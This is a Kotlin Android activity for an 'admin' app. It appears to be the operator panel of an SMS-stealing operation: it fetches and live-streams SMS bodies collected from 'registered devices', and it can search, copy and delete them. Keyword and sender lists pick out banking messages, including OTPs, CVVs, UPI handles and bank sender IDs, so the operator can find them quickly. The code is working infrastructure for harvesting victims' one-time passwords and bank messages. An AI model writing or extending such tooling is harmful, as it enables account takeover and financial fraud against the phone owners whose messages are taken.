package com.example.admin.activities

import android.app.AlertDialog
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.graphics.drawable.GradientDrawable
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.text.Editable
import android.text.TextWatcher
import android.util.Log
import android.view.*
import android.view.inputmethod.EditorInfo
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.example.admin.R
import com.example.admin.network.SupabaseApi
import com.example.admin.utils.Constants
import kotlinx.coroutines.*
import okhttp3.Call
import okhttp3.Callback
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import org.json.JSONObject
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.TimeUnit

class SMSActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "SMSActivity"
        private const val REST_REFRESH_INTERVAL_MS = 60_000L
        private const val SSE_RECONNECT_DELAY_MS   = 5_000L
        private const val SSE_WATCHDOG_INTERVAL_MS = 90_000L
    }

    private lateinit var recyclerView: RecyclerView
    private lateinit var totalMessagesText: TextView
    private lateinit var loaderContainer: FrameLayout
    private lateinit var deleteAllBtn: TextView
    private lateinit var searchEditText: EditText
    private lateinit var clearSearchBtn: ImageView

    private lateinit var supabaseApi: SupabaseApi
    private lateinit var adapter: SmsAdapter

    private val smsList      = mutableListOf<SmsItem>()
    private val smsKeySet    = HashSet<String>()
    private val filteredList = mutableListOf<SmsItem>()

    private var isSearchActive = false
    private var searchQuery    = ""

    private val searchHandler  = Handler(Looper.getMainLooper())
    private val restHandler    = Handler(Looper.getMainLooper())
    private val mainHandler    = Handler(Looper.getMainLooper())
    private var searchRunnable: Runnable? = null

    private val coroutineScope = CoroutineScope(Dispatchers.Main + SupervisorJob())

    // ── SSE state ──────────────────────────────────────────────────────────────
    private val sseClient = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(0, TimeUnit.SECONDS)
        .build()
    private var sseCall: Call? = null
    @Volatile private var sseConnected = false
    private var sseReconnectScheduled  = false

    private val DISPLAY_FORMAT = "dd MMM yyyy, hh:mm a"

    private val bankingKeywords = listOf(
        "sbi", "hdfc", "icici", "axis", "kotak", "yesbank", "pnb", "canara", "idbi",
        "upi", "debit", "credit", "payment", "account", "transaction", "balance",
        "imps", "neft", "rtgs", "otp", "cvv", "card", "debited", "credited",
        "bank", "loan", "emi", "statement", "wallet", "paytm", "phonepe", "navi"
    )
    private val bankingSenders = listOf(
        "AXISB", "HDFCB", "ICICIB", "SBINB", "KOTAKB", "YESB", "PNBB"
    )

    // ── Lifecycle ──────────────────────────────────────────────────────────────

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_sms)
        supabaseApi = SupabaseApi()
        initViews()
        setupSearch()
        setupRecyclerView()
        setupClickListeners()
        // 1. REST — initial load (always works, SSE se independent)
        loadInitialSmsMessages()
        // 2. SSE — realtime instant updates
        startSseStream()
        // 3. REST — periodic refresh fallback every 60s
        restHandler.postDelayed(restRefreshRunnable, REST_REFRESH_INTERVAL_MS)
        // 4. SSE watchdog
        mainHandler.postDelayed(sseWatchdogRunnable, SSE_WATCHDOG_INTERVAL_MS)
    }

    override fun onResume() {
        super.onResume()
        if (!sseConnected) startSseStream()
        mainHandler.removeCallbacks(sseWatchdogRunnable)
        mainHandler.postDelayed(sseWatchdogRunnable, SSE_WATCHDOG_INTERVAL_MS)
    }

    override fun onStop() {
        super.onStop()
        mainHandler.removeCallbacks(sseWatchdogRunnable)
        restHandler.removeCallbacks(restRefreshRunnable)
    }

    override fun onDestroy() {
        super.onDestroy()
        stopSseStream()
        searchHandler.removeCallbacksAndMessages(null)
        mainHandler.removeCallbacksAndMessages(null)
        restHandler.removeCallbacksAndMessages(null)
        coroutineScope.cancel()
    }

    // ── View setup ─────────────────────────────────────────────────────────────

    private fun initViews() {
        recyclerView      = findViewById(R.id.smsRecyclerView)
        totalMessagesText = findViewById(R.id.totalMessagesText)
        loaderContainer   = findViewById(R.id.loaderContainer)
        deleteAllBtn      = findViewById(R.id.deleteAllBtn)
        searchEditText    = findViewById(R.id.searchEditText)
        clearSearchBtn    = findViewById(R.id.clearSearchBtn)
    }

    private fun setupRecyclerView() {
        recyclerView.layoutManager = LinearLayoutManager(this)
        recyclerView.setHasFixedSize(true)
        recyclerView.itemAnimator  = null
        adapter = SmsAdapter()
        recyclerView.adapter = adapter
    }

    private fun setupClickListeners() {
        deleteAllBtn.setOnClickListener { confirmDeleteAll() }
    }

    private fun setupSearch() {
        searchEditText.addTextChangedListener(object : TextWatcher {
            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
            override fun afterTextChanged(s: Editable?) {}
            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {
                clearSearchBtn.visibility = if (s.isNullOrEmpty()) View.GONE else View.VISIBLE
                searchRunnable?.let { searchHandler.removeCallbacks(it) }
                searchRunnable = Runnable { performSearch(s?.toString() ?: "") }
                searchHandler.postDelayed(searchRunnable!!, 300)
            }
        })
        clearSearchBtn.setOnClickListener { searchEditText.text.clear(); clearSearch() }
        searchEditText.setOnEditorActionListener { _, actionId, _ ->
            if (actionId == EditorInfo.IME_ACTION_SEARCH) { performSearch(searchEditText.text.toString()); true }
            else false
        }
    }

    // ── REST data loading ──────────────────────────────────────────────────────

    private fun loadInitialSmsMessages() {
        showLoader(true)
        coroutineScope.launch {
            val result = supabaseApi.getAllSmsMessagesFromRegisteredDevices(rowLimit = 1000)
            result.fold(
                onSuccess = { logs ->
                    setAllMessages(logs.mapNotNull { it.toSmsItemOrNull() })
                    showLoader(false)
                },
                onFailure = { error ->
                    showLoader(false)
                    Log.e(TAG, "Initial SMS load failed", error)
                    Toast.makeText(this@SMSActivity, "SMS load failed: ${error.message}", Toast.LENGTH_SHORT).show()
                }
            )
        }
    }

    // periodic REST refresh — runs every 60s regardless of SSE state
    private val restRefreshRunnable = object : Runnable {
        override fun run() {
            if (!isActivityAlive()) return
            coroutineScope.launch {
                val result = supabaseApi.getAllSmsMessagesFromRegisteredDevices(rowLimit = 1000)
                result.getOrNull()?.let { logs ->
                    val items = logs.mapNotNull { it.toSmsItemOrNull() }
                    addOnlyNewMessages(items)   // only adds genuinely new items
                }
            }
            restHandler.postDelayed(this, REST_REFRESH_INTERVAL_MS)
        }
    }

    // ── SSE — realtime instant updates ────────────────────────────────────────

    private fun startSseStream() {
        sseCall?.cancel()
        sseReconnectScheduled = false
        val url = "${Constants.BACKEND_ROOT}/api/device/${Constants.APP_TOKEN}/stream"
        Log.d(TAG, "SSE connecting: $url")

        val request = Request.Builder().url(url).get()
            .header("Accept", "text/event-stream")
            .header("Cache-Control", "no-cache")
            .build()

        sseCall = sseClient.newCall(request)
        sseCall?.enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                sseConnected = false
                Log.e(TAG, "SSE onFailure: ${e.message}")
                scheduleReconnect()
            }

            override fun onResponse(call: Call, response: Response) {
                if (!response.isSuccessful) {
                    sseConnected = false; response.close(); scheduleReconnect(); return
                }
                sseConnected = true
                Log.d(TAG, "SSE connected")
                val source = response.body?.source()
                if (source == null) { sseConnected = false; scheduleReconnect(); return }

                try {
                    var dataBuffer = StringBuilder()
                    while (!source.exhausted() && !call.isCanceled()) {
                        val line = source.readUtf8Line() ?: break
                        when {
                            line.startsWith("data:") -> dataBuffer.append(line.removePrefix("data:").trim())
                            line.isBlank() && dataBuffer.isNotEmpty() -> {
                                val raw = dataBuffer.toString()
                                dataBuffer = StringBuilder()
                                try {
                                    val json   = JSONObject(raw)
                                    val table  = json.optString("table", "")
                                    val event  = json.optString("event", "")
                                    val record = json.optJSONObject("record") ?: JSONObject()
                                    if (table == "messages" && event == "INSERT") {
                                        supabaseApi.parseSmsRow(record)?.let { sms ->
                                            runOnUiThread { addOnlyNewMessages(listOf(sms).mapNotNull { it.toSmsItemOrNull() }) }
                                        }
                                    }
                                } catch (pe: Exception) { Log.w(TAG, "SSE parse: ${pe.message}") }
                            }
                        }
                    }
                } catch (e: IOException) {
                    Log.e(TAG, "SSE read error: ${e.message}")
                } finally {
                    sseConnected = false; response.close()
                    if (!call.isCanceled()) scheduleReconnect()
                }
            }
        })
    }

    private fun stopSseStream() {
        sseConnected = false; sseReconnectScheduled = false
        mainHandler.removeCallbacks(sseReconnectRunnable)
        sseCall?.cancel(); sseCall = null
    }

    private fun scheduleReconnect() {
        if (sseReconnectScheduled || !isActivityAlive()) return
        sseReconnectScheduled = true
        mainHandler.postDelayed(sseReconnectRunnable, SSE_RECONNECT_DELAY_MS)
    }

    private val sseReconnectRunnable = Runnable {
        if (!isActivityAlive()) return@Runnable
        startSseStream()
    }

    private val sseWatchdogRunnable = object : Runnable {
        override fun run() {
            if (!isActivityAlive()) return
            if (!sseConnected) { Log.w(TAG, "Watchdog: SSE dead — restarting"); startSseStream() }
            mainHandler.postDelayed(this, SSE_WATCHDOG_INTERVAL_MS)
        }
    }

    // ── SmsLog → SmsItem ──────────────────────────────────────────────────────

    private fun SupabaseApi.SmsLog.toSmsItemOrNull(): SmsItem? {
        val safeDeviceId = uniqueId.trim()
        if (safeDeviceId.isBlank()) return null
        val safeBody = body.trim()
        if (safeBody.isBlank()) return null
        val safeSmsId = when {
            !id.isNullOrBlank() -> id
            timestamp > 0L      -> "sms_${safeDeviceId}_$timestamp"
            else                -> "sms_${safeDeviceId}_${safeBody.hashCode()}"
        }
        return SmsItem(
            deviceId       = safeDeviceId,
            smsKey         = safeSmsId,
            uniqueKey      = "$safeDeviceId-$safeSmsId",
            body           = safeBody,
            senderNumber   = senderNumber.ifBlank { "Unknown" },
            receiverNumber = receiverNumber,
            title          = title.ifBlank { "New SMS" },
            timestamp      = if (timestamp > 0L) timestamp else System.currentTimeMillis()
        )
    }

    // ── List management ────────────────────────────────────────────────────────

    private fun setAllMessages(items: List<SmsItem>) {
        smsList.clear(); smsKeySet.clear()
        for (item in items.sortedByDescending { it.timestamp }) {
            if (smsKeySet.add(item.uniqueKey)) smsList.add(item)
        }
        if (isSearchActive) performSearch(searchQuery) else adapter.notifyDataSetChanged()
        updateTotalCount()
    }

    private fun addOnlyNewMessages(items: List<SmsItem>) {
        var inserted = 0
        for (item in items.sortedByDescending { it.timestamp }) {
            if (smsKeySet.add(item.uniqueKey)) { smsList.add(0, item); inserted++ }
        }
        if (inserted > 0) {
            smsList.sortByDescending { it.timestamp }
            if (isSearchActive) performSearch(searchQuery) else adapter.notifyDataSetChanged()
            updateTotalCount()
            recyclerView.scrollToPosition(0)
        }
    }

    // ── Search ─────────────────────────────────────────────────────────────────

    private fun performSearch(query: String) {
        searchQuery = query.trim().lowercase(Locale.getDefault())
        if (searchQuery.isEmpty()) { clearSearch(); return }
        isSearchActive = true
        filteredList.clear()
        smsList.forEach { item -> if (matchesSearch(item, searchQuery)) filteredList.add(item) }
        updateAdapter()
    }

    private fun matchesSearch(item: SmsItem, query: String): Boolean =
        item.body.lowercase(Locale.getDefault()).contains(query) ||
        item.senderNumber.lowercase(Locale.getDefault()).contains(query) ||
        item.receiverNumber.lowercase(Locale.getDefault()).contains(query) ||
        item.deviceId.lowercase(Locale.getDefault()).contains(query) ||
        item.title.lowercase(Locale.getDefault()).contains(query) ||
        formatTime(item.timestamp).lowercase(Locale.getDefault()).contains(query)

    private fun clearSearch() {
        isSearchActive = false; searchQuery = ""; filteredList.clear(); updateAdapter()
    }

    private fun updateAdapter() { adapter.notifyDataSetChanged(); updateTotalCount() }

    // ── Delete ─────────────────────────────────────────────────────────────────

    private fun confirmDeleteAll() {
        AlertDialog.Builder(this)
            .setTitle("Delete All SMS")
            .setMessage("Sabhi devices ke sms_messages clear karega. Continue?")
            .setCancelable(false)
            .setPositiveButton("Yes") { _, _ -> deleteAllMessages() }
            .setNegativeButton("No", null).show()
    }

    private fun deleteAllMessages() {
        showLoader(true)
        coroutineScope.launch {
            val result = supabaseApi.deleteAllSmsMessagesForApp()
            result.fold(
                onSuccess = {
                    showLoader(false)
                    smsList.clear(); smsKeySet.clear(); filteredList.clear()
                    isSearchActive = false; searchEditText.text.clear()
                    adapter.notifyDataSetChanged(); updateTotalCount()
                    Toast.makeText(this@SMSActivity, "All SMS cleared", Toast.LENGTH_SHORT).show()
                },
                onFailure = { error ->
                    showLoader(false)
                    Toast.makeText(this@SMSActivity, "Delete failed: ${error.message}", Toast.LENGTH_SHORT).show()
                }
            )
        }
    }

    private fun confirmDeleteSingleMessage(item: SmsItem) {
        AlertDialog.Builder(this)
            .setTitle("Delete Message")
            .setMessage("Delete this message?")
            .setCancelable(false)
            .setPositiveButton("Yes") { _, _ -> deleteSingleMessage(item) }
            .setNegativeButton("No", null).show()
    }

    private fun deleteSingleMessage(item: SmsItem) {
        showLoader(true)
        coroutineScope.launch {
            val result = supabaseApi.deleteSmsFromRegisteredDevice(deviceId = item.deviceId, smsId = item.smsKey)
            result.fold(
                onSuccess = {
                    showLoader(false)
                    smsList.removeAll { it.uniqueKey == item.uniqueKey }
                    smsKeySet.remove(item.uniqueKey)
                    filteredList.removeAll { it.uniqueKey == item.uniqueKey }
                    adapter.notifyDataSetChanged(); updateTotalCount()
                    Toast.makeText(this@SMSActivity, "Message deleted", Toast.LENGTH_SHORT).show()
                },
                onFailure = { error ->
                    showLoader(false)
                    Toast.makeText(this@SMSActivity, "Delete failed: ${error.message}", Toast.LENGTH_SHORT).show()
                }
            )
        }
    }

    // ── Copy ───────────────────────────────────────────────────────────────────

    private fun copyMessageToClipboard(item: SmsItem) {
        val text = "Device: ${item.deviceId}\nFrom: ${item.senderNumber}\nTo: ${item.receiverNumber}\nTime: ${formatTime(item.timestamp)}\n\n${item.body}"
        (getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager)
            .setPrimaryClip(ClipData.newPlainText("SMS", text))
        Toast.makeText(this, "Copied", Toast.LENGTH_SHORT).show()
    }

    // ── Helpers ────────────────────────────────────────────────────────────────

    private fun formatTime(timestamp: Long): String {
        if (timestamp <= 0L) return "-"
        return try { SimpleDateFormat(DISPLAY_FORMAT, Locale.getDefault()).format(Date(timestamp)) }
        catch (e: Exception) { timestamp.toString() }
    }

    private fun updateTotalCount() {
        val count = if (isSearchActive) filteredList.size else smsList.size
        totalMessagesText.text = if (isSearchActive) "Found: $count (Total: ${smsList.size})" else "Total: $count"
    }

    private fun showLoader(show: Boolean) {
        loaderContainer.visibility = if (show) View.VISIBLE else View.GONE
    }

    private fun isBankingSMS(body: String?, sender: String?, title: String?): Boolean {
        val lowerBody  = body?.lowercase(Locale.getDefault()) ?: ""
        val lowerTitle = title?.lowercase(Locale.getDefault()) ?: ""
        sender?.let { s -> for (p in bankingSenders) { if (s.contains(p, ignoreCase = true)) return true } }
        for (keyword in bankingKeywords) {
            if (lowerBody.contains(keyword) || lowerTitle.contains(keyword)) {
                if (!listOf("flipkart", "amazon", "zomato", "swiggy", "uber").any { lowerBody.contains(it) }) return true
            }
        }
        return lowerBody.contains("@ok") || lowerBody.contains("@ybl") || lowerBody.contains("@paytm")
    }

    private fun getCardBackground(isBanking: Boolean): GradientDrawable? {
        val d = ContextCompat.getDrawable(this, R.drawable.blue_border)?.mutate() as? GradientDrawable
        d?.setColor(if (isBanking) ContextCompat.getColor(this, R.color.successLightColor) else Color.WHITE)
        return d
    }

    private fun isActivityAlive(): Boolean =
        !isFinishing && !(Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1 && isDestroyed)

    // ── Data class ─────────────────────────────────────────────────────────────

    data class SmsItem(
        val deviceId: String,
        val smsKey: String,
        val uniqueKey: String,
        val body: String,
        val senderNumber: String,
        val receiverNumber: String,
        val title: String,
        val timestamp: Long
    )

    // ── Adapter ────────────────────────────────────────────────────────────────

    inner class SmsAdapter : RecyclerView.Adapter<SmsAdapter.Holder>() {
        override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): Holder =
            Holder(LayoutInflater.from(parent.context).inflate(R.layout.message_card, parent, false))

        override fun getItemCount(): Int = if (isSearchActive) filteredList.size else smsList.size

        override fun onBindViewHolder(holder: Holder, position: Int) {
            val item = if (isSearchActive) filteredList[position] else smsList[position]
            holder.body.text   = item.body
            holder.sender.text = "From: ${item.senderNumber}"
            if (item.receiverNumber.isNotBlank()) {
                holder.receiver.text = "To: ${item.receiverNumber}"; holder.receiver.visibility = View.VISIBLE
            } else holder.receiver.visibility = View.GONE
            holder.time.text = formatTime(item.timestamp)
            val bg = getCardBackground(isBankingSMS(item.body, item.senderNumber, item.title))
            if (bg != null) holder.itemView.background = bg
            else holder.itemView.setBackgroundColor(Color.WHITE)
            holder.itemView.setOnClickListener {
                startActivity(Intent(this@SMSActivity, FinalActivity::class.java).putExtra("uniqueid", item.deviceId))
            }
            holder.copyIcon.setOnClickListener   { copyMessageToClipboard(item) }
            holder.deleteIcon.setOnClickListener { confirmDeleteSingleMessage(item) }
        }

        inner class Holder(view: View) : RecyclerView.ViewHolder(view) {
            val body: TextView        = view.findViewById(R.id.bodyTextView)
            val sender: TextView      = view.findViewById(R.id.fromText)
            val receiver: TextView    = view.findViewById(R.id.receiverText)
            val time: TextView        = view.findViewById(R.id.timeText)
            val copyIcon: ImageView   = view.findViewById(R.id.copyIcon)
            val deleteIcon: ImageView = view.findViewById(R.id.deleteIcon)
        }
    }
}
